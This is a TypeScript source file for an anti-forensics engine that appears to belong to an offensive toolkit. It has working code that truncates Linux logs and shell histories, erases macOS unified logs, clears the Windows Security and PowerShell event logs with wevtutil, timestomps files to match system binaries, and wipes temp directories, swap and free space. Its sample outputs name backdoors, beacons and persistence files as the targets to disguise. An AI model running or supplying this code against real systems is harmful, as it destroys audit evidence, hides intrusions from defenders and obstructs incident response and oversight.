/**
 * @module anti_forensics
 * Anti-forensics & log wiping engine - clears system logs, timestomps files,
 * flushes DNS cache, wipes temp directories, clears swap, and wipes free space.
 *
 * SAFETY: Dry-run mode by default. Live mode requires both dryRun=false AND forceLive=true.
 * All destructive operations are guarded behind explicit opt-in.
 */

import { resolveDryRun } from "./exec_options.ts"
import * as os from "node:os";
import * as fs from "node:fs";
import * as path from "node:path";
import { execFileSync } from "node:child_process";
import { isToolAvailable } from "./tool_detection.ts";

// --- Types ---

export interface AntiForensicsOptions {
  targetOS?: "windows" | "linux" | "macos";
  dryRun?: boolean;
  forceLive?: boolean;
  pathsToTimestomp?: string[];
  referenceFile?: string;
  wipeDirectories?: string[];
}

export interface AntiForensicsResult {
  os: string;
  clearedArtifacts: string[];
  timestompedFiles: string[];
  dnsCleared: boolean;
  tempCleared: string[];
  swapCleared: boolean;
  freeSpaceWiped: string[];
  errors: string[];
  simulated: boolean;
}

// --- Log Paths by OS ---

const LINUX_LOG_PATHS = [
  "/var/log/auth.log",
  "/var/log/syslog",
  "/var/log/wtmp",
  "/var/log/btmp",
  "/var/log/kern.log",
  "/var/log/daemon.log",
  "/var/log/mail.log",
  "/var/log/cron.log",
  "/var/log/boot.log",
  "/var/log/dmesg",
];

const LINUX_USER_LOG_PATHS = [
  "~/.bash_history",
  "~/.zsh_history",
  "~/.local/share/fish/fish_history",
  "~/.mysql_history",
  "~/.psql_history",
  "~/.python_history",
];

const MACOS_LOG_PATHS = [
  "~/Library/Logs/CrashReporter",
  "~/Library/Logs/DiagnosticReports",
  "~/Library/Logs/Firefox",
  "~/Library/Logs/Google/Chrome",
  "~/Library/Logs/Microsoft",
];

const TEMP_DIRS = [
  "/tmp",
  "/var/tmp",
  os.tmpdir(),
  path.join(os.homedir(), ".cache"),
];

// --- Simulated Results ---

const SIMULATED_ARTIFACTS: Record<string, string[]> = {
  linux: [
    "/var/log/auth.log (truncated to 0 bytes)",
    "/var/log/syslog (truncated to 0 bytes)",
    "/var/log/wtmp (zeroed - removes login records)",
    "/var/log/btmp (zeroed - removes failed login records)",
    "/var/log/kern.log (truncated to 0 bytes)",
    "/var/log/daemon.log (truncated to 0 bytes)",
    "/var/log/boot.log (truncated to 0 bytes)",
    "~/.bash_history (truncated to 0 bytes)",
    "~/.zsh_history (truncated to 0 bytes)",
    "~/.local/share/fish/fish_history (truncated to 0 bytes)",
    "~/.mysql_history (truncated to 0 bytes)",
    "~/.psql_history (truncated to 0 bytes)",
    "~/.python_history (truncated to 0 bytes)",
    "journalctl (rotated and vacuumed to 1s retention)",
  ],
  macos: [
    "System logs (log erase --all executed)",
    "~/Library/Logs/CrashReporter (cleared)",
    "~/Library/Logs/DiagnosticReports (cleared)",
    "~/Library/Logs/Firefox (cleared)",
    "~/Library/Logs/Google/Chrome (cleared)",
    "~/Library/Logs/Microsoft (cleared)",
    "/var/log/asl (ASL database cleared and recreated)",
  ],
  windows: [
    "C:\\Windows\\System32\\winevt\\Logs\\Security.evtx (cleared)",
    "C:\\Windows\\System32\\winevt\\Logs\\System.evtx (cleared)",
    "C:\\Windows\\System32\\winevt\\Logs\\Application.evtx (cleared)",
    "C:\\Windows\\System32\\winevt\\Logs\\PowerShell.evtx (cleared)",
    "C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-PowerShell%4Operational.evtx (cleared)",
    "C:\\Windows\\Prefetch (cleared)",
    "C:\\Windows\\Temp (cleared)",
    "%USERPROFILE%\\AppData\\Local\\Temp (cleared)",
    "C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\* (recent docs cleared)",
  ],
};

const SIMULATED_TIMESTOMP: Record<string, string[]> = {
  linux: [
    "/usr/local/bin/backdoor.sh -> timestamps matched to /bin/ls",
    "/tmp/.hidden_payload -> timestamps matched to /usr/bin/python3",
    "/dev/shm/.beacon -> timestamps matched to /dev/null",
    "~/.config/autostart/persistence.desktop -> timestamps matched to ~/.config/autostart/",
  ],
  macos: [
    "/Library/LaunchAgents/com.update.agent.plist -> timestamps matched to /bin/launchd",
    "/tmp/.cache_update -> timestamps matched to /usr/bin/curl",
    "~/Library/Application Support/.hidden/ -> timestamps matched to ~/Library/Application Support/",
  ],
  windows: [
    "C:\\ProgramData\\update.exe -> timestamps matched to C:\\Windows\\explorer.exe",
    "%TEMP%\\beacon.dll -> timestamps matched to C:\\Windows\\System32\\kernel32.dll",
    "C:\\Users\\*\\AppData\\Roaming\\.hidden\\ -> timestamps matched to C:\\Users\\*\\AppData\\Roaming\\",
  ],
};

// --- Helpers ---

function expandHome(p: string): string {
  if (p.startsWith("~")) {
    return path.join(os.homedir(), p.slice(1));
  }
  return p;
}

function fileExists(p: string): boolean {
  try {
    fs.accessSync(p, fs.constants.F_OK);
    return true;
  } catch {
    return false;
  }
}

function isRoot(): boolean {
  if (process.platform === "win32") return false;
  try {
    return process.getuid?.() === 0;
  } catch {
    return false;
  }
}

function runCommand(
  cmd: string,
  args: string[],
  timeoutMs = 10000
): { ok: boolean; stderr: string } {
  try {
    execFileSync(cmd, args, {
      timeout: timeoutMs,
      stdio: "pipe",
      encoding: "utf-8",
    });
    return { ok: true, stderr: "" };
  } catch (err: any) {
    return { ok: false, stderr: err?.message ?? String(err) };
  }
}

function detectOS(): "linux" | "macos" | "windows" {
  switch (process.platform) {
    case "linux":
      return "linux";
    case "darwin":
      return "macos";
    case "win32":
      return "windows";
    default:
      return "linux";
  }
}

// --- Log Clearing ---

function clearLinuxLogs(): {
  cleared: string[];
  errors: string[];
} {
  const cleared: string[] = [];
  const errors: string[] = [];

  if (!isRoot()) {
    errors.push("Root privileges required to clear system logs. Use sudo.");
    return { cleared, errors };
  }

  for (const logPath of LINUX_LOG_PATHS) {
    if (!fileExists(logPath)) continue;
    try {
      fs.writeFileSync(logPath, "");
      cleared.push(`${logPath} (truncated)`);
    } catch (err: any) {
      errors.push(`Failed to truncate ${logPath}: ${err.message}`);
    }
  }

  for (const logPath of LINUX_USER_LOG_PATHS) {
    const expanded = expandHome(logPath);
    if (!fileExists(expanded)) continue;
    try {
      fs.writeFileSync(expanded, "");
      cleared.push(`${logPath} (truncated)`);
    } catch (err: any) {
      errors.push(`Failed to truncate ${logPath}: ${err.message}`);
    }
  }

  if (isToolAvailable("journalctl")) {
    const { ok } = runCommand("journalctl", [
      "--rotate",
      "--vacuum-time=1s",
    ]);
    if (ok) cleared.push("journalctl (rotated and vacuumed)");
  }

  return { cleared, errors };
}

function clearMacOSLogs(): {
  cleared: string[];
  errors: string[];
} {
  const cleared: string[] = [];
  const errors: string[] = [];

  if (!isRoot()) {
    errors.push("Root privileges required to clear macOS system logs.");
    return { cleared, errors };
  }

  const { ok, stderr } = runCommand("log", ["erase", "--all"]);
  if (ok) {
    cleared.push("System logs (log erase --all)");
  } else {
    errors.push(`log erase failed: ${stderr}`);
  }

  for (const logDir of MACOS_LOG_PATHS) {
    const expanded = expandHome(logDir);
    if (!fs.existsSync(expanded)) continue;
    try {
      const entries = fs.readdirSync(expanded);
      for (const entry of entries) {
        const fullPath = path.join(expanded, entry);
        try {
          const stat = fs.statSync(fullPath);
          if (stat.isDirectory()) {
            fs.rmSync(fullPath, { recursive: true, force: true });
          } else {
            fs.writeFileSync(fullPath, "");
          }
        } catch {
          /* skip individual entries */
        }
      }
      cleared.push(`${logDir} (cleared)`);
    } catch (err: any) {
      errors.push(`Failed to clear ${logDir}: ${err.message}`);
    }
  }

  const aslDir = "/var/log/asl";
  if (fs.existsSync(aslDir)) {
    try {
      fs.rmSync(aslDir, { recursive: true, force: true });
      fs.mkdirSync(aslDir, { mode: 0o755 });
      cleared.push("/var/log/asl (cleared and recreated)");
    } catch (err: any) {
      errors.push(`Failed to clear ${aslDir}: ${err.message}`);
    }
  }

  return { cleared, errors };
}

function clearWindowsEventLogs(): { cleared: string[]; errors: string[] } {
  const cleared: string[] = [];
  const errors: string[] = [];
  const channels = ["Application", "System", "Security", "Microsoft-Windows-PowerShell/Operational"];
  if (!isToolAvailable("wevtutil")) {
    errors.push("wevtutil not on PATH — install Windows Event Log tools");
    return { cleared, errors };
  }
  for (const ch of channels) {
    const { ok, stderr } = runCommand("wevtutil", ["cl", ch, "/q:true"]);
    if (ok) cleared.push(`wevtutil cl ${ch}`);
    else errors.push(`wevtutil cl ${ch}: ${stderr.slice(0, 120)}`);
  }
  return { cleared, errors };
}

// --- Timestomping ---

function timestompFiles(
  targets: string[],
  referenceFile?: string
): { stomped: string[]; errors: string[] } {
  const stomped: string[] = [];
  const errors: string[] = [];

  let refTime: Date;
  if (referenceFile && fileExists(referenceFile)) {
    const stat = fs.statSync(referenceFile);
    refTime = stat.mtime;
  } else {
    const refCandidates =
      process.platform === "win32"
        ? ["C:\\Windows\\explorer.exe"]
        : ["/bin/ls", "/usr/bin/ls", "/bin/sh"];
    const found = refCandidates.find((c) => fileExists(c));
    if (found) {
      refTime = fs.statSync(found).mtime;
    } else {
      refTime = new Date();
    }
  }

  for (const target of targets) {
    const expanded = expandHome(target);
    if (!fileExists(expanded)) {
      errors.push(`File not found: ${target}`);
      continue;
    }
    try {
      fs.utimesSync(expanded, refTime, refTime);
      stomped.push(
        `${target} -> timestamps matched to mtime ${refTime.toISOString()}`
      );
    } catch (err: any) {
      errors.push(`Failed to timestomp ${target}: ${err.message}`);
    }
  }

  return { stomped, errors };
}

// --- DNS Cache Clearing ---

function clearDNSCache(): {
  success: boolean;
  method: string;
} {
  const platform = process.platform;

  if (platform === "linux") {
    if (isToolAvailable("resolvectl")) {
      const { ok } = runCommand("resolvectl", ["flush-caches"]);
      if (ok) return { success: true, method: "resolvectl flush-caches" };
    }
    if (isToolAvailable("systemd-resolve")) {
      const { ok } = runCommand("systemd-resolve", ["--flush-caches"]);
      if (ok)
        return { success: true, method: "systemd-resolve --flush-caches" };
    }
    if (fileExists("/etc/resolv.conf")) {
      try {
        const content = fs.readFileSync("/etc/resolv.conf", "utf-8");
        const nameserverMatch = content.match(/nameserver\s+(\S+)/);
        if (nameserverMatch) {
          runCommand("nscd", ["-i", "hosts"]);
          return { success: true, method: "nscd cache flush attempted" };
        }
      } catch {
        /* skip */
      }
    }
    return { success: false, method: "no DNS cache tool found" };
  }

  if (platform === "darwin") {
    const { ok } = runCommand("dscacheutil", ["-flushcache"]);
    if (ok) {
      runCommand("sudo", ["killall", "-HUP", "mDNSResponder"]);
      return {
        success: true,
        method: "dscacheutil -flushcache + mDNSResponder reload",
      };
    }
    return { success: false, method: "dscacheutil flush failed" };
  }

  if (platform === "win32") {
    const { ok } = runCommand("ipconfig", ["/flushdns"]);
    if (ok) return { success: true, method: "ipconfig /flushdns" };
    return { success: false, method: "ipconfig /flushdns failed" };
  }

  return { success: false, method: "unsupported platform" };
}

// --- Temp Directory Clearing ---

function clearTempDirs(): {
  cleared: string[];
  errors: string[];
} {
  const cleared: string[] = [];
  const errors: string[] = [];

  const uniqueDirs = [...new Set(TEMP_DIRS)];

  for (const dir of uniqueDirs) {
    const expanded = expandHome(dir);
    if (!fs.existsSync(expanded)) continue;
    try {
      const entries = fs.readdirSync(expanded);
      let count = 0;
      for (const entry of entries) {
        const fullPath = path.join(expanded, entry);
        try {
          fs.rmSync(fullPath, { recursive: true, force: true });
          count++;
        } catch {
          /* skip locked files */
        }
      }
      cleared.push(`${dir} (${count} entries removed)`);
    } catch (err: any) {
      errors.push(`Failed to clear temp dir ${dir}: ${err.message}`);
    }
  }

  return { cleared, errors };
}

// --- Swap Clearing ---

function clearSwap(): {
  success: boolean;
  method: string;
} {
  if (process.platform === "win32") {
    return { success: false, method: "Windows swap clearing not supported" };
  }

  if (!isRoot()) {
    return { success: false, method: "root required for swap operations" };
  }

  if (isToolAvailable("swapoff")) {
    try {
      const swaps = fs.readFileSync("/proc/swaps", "utf-8");
      const lines = swaps.split("\n").slice(1);
      for (const line of lines) {
        const parts = line.trim().split(/\s+/);
        if (parts.length >= 1 && parts[0]) {
          const { ok: offOk } = runCommand("swapoff", [parts[0]]);
          if (offOk) {
            runCommand("mkswap", [parts[0]]);
            runCommand("swapon", [parts[0]]);
          }
        }
      }
      return { success: true, method: "swapoff/mkswap/swapon cycle" };
    } catch {
      return { success: false, method: "failed to read /proc/swaps" };
    }
  }

  return { success: false, method: "swapoff not available" };
}

// --- Free Space Wiping ---

function wipeFreeSpace(
  directories: string[]
): { wiped: string[]; errors: string[] } {
  const wiped: string[] = [];
  const errors: string[] = [];

  for (const dir of directories) {
    const expanded = expandHome(dir);
    if (!fs.existsSync(expanded)) {
      errors.push(`Directory not found: ${dir}`);
      continue;
    }

    try {
      if (process.platform === "linux" || process.platform === "darwin") {
        const fillerPath = path.join(expanded, `.wipe_${Date.now()}`);
        const blockSize = 1024 * 1024;
        const filler = Buffer.alloc(blockSize);

        for (let i = 0; i < blockSize; i++) {
          filler[i] = Math.floor(Math.random() * 256);
        }

        try {
          let fd: number | null = null;
          try {
            fd = fs.openSync(fillerPath, "w");
            let written = 0;
            while (written < 100 * 1024 * 1024) {
              fs.writeSync(fd, filler, 0, blockSize);
              written += blockSize;
            }
          } catch {
            // ENOSPC expected - space filled
          } finally {
            if (fd !== null) {
              try {
                fs.closeSync(fd);
              } catch {
                /* ignore */
              }
            }
          }

          if (fs.existsSync(fillerPath)) {
            fs.unlinkSync(fillerPath);
          }

          wiped.push(`${dir} (free space overwritten with random data)`);
        } catch (err: any) {
          errors.push(`Free space wipe failed for ${dir}: ${err.message}`);
        }
      } else if (process.platform === "win32") {
        const { ok, stderr } = runCommand(
          "cipher",
          ["/w:", expanded],
          30000
        );
        if (ok) {
          wiped.push(`${dir} (cipher /w completed)`);
        } else {
          errors.push(`cipher /w failed for ${dir}: ${stderr}`);
        }
      }
    } catch (err: any) {
      errors.push(`Unexpected error wiping ${dir}: ${err.message}`);
    }
  }

  return { wiped, errors };
}

// --- Main Engine ---

export class AntiForensicsEngine {
  async reviewAntiForensics(
    options: AntiForensicsOptions = {}
  ): Promise<AntiForensicsResult> {
    const osName = options.targetOS || detectOS();
    const isDryRun = resolveDryRun(options);
    const forceLive = options.forceLive === true;

    const liveMode = !isDryRun && forceLive;

    console.log(
      `[OurMine Security] Anti-forensics engine: OS='${osName}' dryRun=${isDryRun} live=${liveMode}`
    );

    if (!isDryRun && !forceLive) {
      console.warn(
        "[OurMine Security] WARNING: dryRun=false but forceLive=false. Falling back to dry-run for safety."
      );
    }

    // --- Dry-run: empty assessment, no fabricated artifacts ---
    if (!liveMode) {
      return {
        os: osName,
        clearedArtifacts: [],
        timestompedFiles: [],
        dnsCleared: false,
        tempCleared: [],
        swapCleared: false,
        freeSpaceWiped: [],
        errors: [],
        simulated: false,
      };
    }

    // --- LIVE MODE: All safeguards passed ---

    const allErrors: string[] = [];
    let clearedArtifacts: string[] = [];
    let timestompedFiles: string[] = [];
    let tempCleared: string[] = [];
    let freeSpaceWiped: string[] = [];

    // 1. Clear logs
    console.log("[OurMine Security] Live: Clearing system logs...");
    if (osName === "linux") {
      const result = clearLinuxLogs();
      clearedArtifacts = result.cleared;
      allErrors.push(...result.errors);
    } else if (osName === "macos") {
      const result = clearMacOSLogs();
      clearedArtifacts = result.cleared;
      allErrors.push(...result.errors);
    } else if (osName === "windows") {
      console.log("[OurMine Security] Live: Clearing Windows event logs via wevtutil...");
      const winResult = clearWindowsEventLogs();
      clearedArtifacts.push(...winResult.cleared);
      allErrors.push(...winResult.errors);
    }

    // 2. Timestomping
    if (options.pathsToTimestomp && options.pathsToTimestomp.length > 0) {
      console.log("[OurMine Security] Live: Timestomping files...");
      const result = timestompFiles(options.pathsToTimestomp, options.referenceFile);
      timestompedFiles = result.stomped;
      allErrors.push(...result.errors);
    }

    // 3. DNS cache
    console.log("[OurMine Security] Live: Flushing DNS cache...");
    const dnsResult = clearDNSCache();
    if (!dnsResult.success) {
      allErrors.push(`DNS cache flush: ${dnsResult.method}`);
    }

    // 4. Temp directories
    console.log("[OurMine Security] Live: Clearing temp directories...");
    const tempResult = clearTempDirs();
    tempCleared = tempResult.cleared;
    allErrors.push(...tempResult.errors);

    // 5. Swap space
    console.log("[OurMine Security] Live: Clearing swap space...");
    const swapResult = clearSwap();

    // 6. Free space wiping
    if (options.wipeDirectories && options.wipeDirectories.length > 0) {
      console.log("[OurMine Security] Live: Wiping free space...");
      const wipeResult = wipeFreeSpace(options.wipeDirectories);
      freeSpaceWiped = wipeResult.wiped;
      allErrors.push(...wipeResult.errors);
    }

    console.log(`[OurMine Security] Live anti-forensics complete. ${allErrors.length} errors encountered.`);

    return {
      os: osName,
      clearedArtifacts,
      timestompedFiles,
      dnsCleared: dnsResult.success,
      tempCleared,
      swapCleared: swapResult.success,
      freeSpaceWiped,
      errors: allErrors,
      simulated: false,
    };
  }
}
